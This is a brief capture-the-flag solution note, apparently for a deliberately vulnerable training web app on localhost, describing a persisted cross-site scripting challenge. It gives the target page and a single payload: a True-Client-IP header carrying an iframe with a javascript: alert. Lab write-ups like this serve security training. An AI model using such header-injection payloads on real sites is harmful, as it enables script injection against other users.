# HTTP-Header XSS
## Challenge Perform a persisted XSS attack through an HTTP header
## Category: XSS

http://localhost:3000/#/privacy-security/last-login-ip

```
True-Client-IP: <iframe src="javascript:alert(``xss``)">
```